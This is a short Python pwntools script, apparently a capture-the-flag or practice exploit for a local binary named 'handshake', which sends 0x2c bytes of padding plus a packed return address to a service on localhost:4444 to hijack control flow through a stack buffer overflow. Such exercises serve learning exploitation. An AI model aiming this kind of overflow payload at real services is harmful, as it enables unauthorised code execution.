from pwn import *
import struct

context.terminal = ['tilix', '-e']

#c = process('./handshake')
#c = gdb.debug('./handshake')
c = remote('localhost', 4444)

c.sendline(b'a'*0x2c + struct.pack("<L", 0x080491c2))
print(c.recvall())
